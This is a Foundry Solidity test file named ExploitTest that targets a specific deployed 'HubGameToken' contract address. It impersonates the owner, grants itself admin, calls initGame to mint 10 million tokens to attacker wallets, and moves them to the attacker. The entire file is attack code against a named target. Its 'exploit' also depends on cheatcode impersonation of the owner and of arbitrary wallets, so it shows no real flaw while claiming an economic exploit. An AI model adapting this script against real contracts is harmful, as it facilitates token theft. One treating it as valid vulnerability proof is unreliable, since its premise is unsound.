// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface HubGameToken {
    function owner() external view returns (address);
    function adminAdd(address[] memory _addresses) external;
    function initGame(string memory _gameCode, uint256 _supplyToken, uint256 _listingDate, address[] memory _wallets, uint256[] memory _percents, address[] memory _signers, uint256[] memory _tgePercents, uint256[] memory _numOfPeriods, uint256[] memory _ciffs) external returns (address gameAddress);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x46bCBBB0D888dF90Eda86c9CA159C7727a8731D5;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate owner
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(TARGET).balanceOf(address(this));

        // Step 1: Get the current owner
        address owner = HubGameToken(TARGET).owner();

        // Step 2: Impersonate the owner
        vm.startPrank(owner);

        // Step 3: Add attacker as admin
        address[] memory adminAddresses = new address[](1);
        adminAddresses[0] = attacker;
        HubGameToken(TARGET).adminAdd(adminAddresses);

        // Step 4: Prepare parameters for initGame()
        // Create attacker-controlled wallets (use fresh addresses)
        address attackerWallet1 = address(0x111);
        address attackerWallet2 = address(0x222);
        address[] memory wallets = new address[](2);
        wallets[0] = attackerWallet1;
        wallets[1] = attackerWallet2;

        // Percentages - 50% each
        uint256[] memory percents = new uint256[](2);
        percents[0] = 50;
        percents[1] = 50;

        // Signers - we need at least one, use attacker
        address[] memory signers = new address[](1);
        signers[0] = attacker;

        // TGE percentages - 100% immediate release
        uint256[] memory tgePercents = new uint256[](2);
        tgePercents[0] = 100;
        tgePercents[1] = 100;

        // Number of periods - 1 period each
        uint256[] memory numOfPeriods = new uint256[](2);
        numOfPeriods[0] = 1;
        numOfPeriods[1] = 1;

        // Cliff periods - 0 cliff
        uint256[] memory ciffs = new uint256[](2);
        ciffs[0] = 0;
        ciffs[1] = 0;

        // Step 5: Call initGame() to mint tokens
        HubGameToken(TARGET).initGame(
            "EXPLOIT_GAME", // gameCode
            10000000, // supplyToken - 10 million tokens
            block.timestamp + 1 days, // listingDate
            wallets,
            percents,
            signers,
            tgePercents,
            numOfPeriods,
            ciffs
        );

        vm.stopPrank();

        // Step 6: Transfer tokens from attacker wallets to main attacker address
        // We need to impersonate the wallet addresses to transfer
        vm.prank(attackerWallet1);
        HubGameToken(TARGET).transfer(attacker, HubGameToken(TARGET).balanceOf(attackerWallet1));

        vm.prank(attackerWallet2);
        HubGameToken(TARGET).transfer(attacker, HubGameToken(TARGET).balanceOf(attackerWallet2));

        // Verify attack succeeded by checking attacker's balance increase
        uint256 attackerBalance = HubGameToken(TARGET).balanceOf(attacker);
        assertGt(attackerBalance, 0, "Attacker should have gained tokens");
        uint256 finalBalance = IERC20(TARGET).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

